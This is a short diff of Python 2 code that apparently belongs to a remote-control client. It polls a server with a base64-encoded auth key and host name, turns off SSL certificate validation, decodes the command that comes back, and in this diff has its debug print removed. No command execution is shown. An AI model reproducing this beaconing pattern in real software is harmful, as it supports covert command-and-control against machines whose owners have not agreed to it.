@@ -63,6 +63,7 @@ def b64decstr(encstr):
 	return decstr
 	
 def web_request(url):
+	
 	h = httplib2.Http(".cache", disable_ssl_certificate_validation=True)
 	resp, content = h.request(url, headers={'user-agent': agent })
 
@@ -100,8 +101,6 @@ def core():
 			getcmd = uri + '?auth=' + cb64key + '&get=' + cb64host
 			b64enccmd = web_request(getcmd)
 			line = b64decstr(b64enccmd)
-			
-			print line
 			
 			if 'Time' in line:
 			
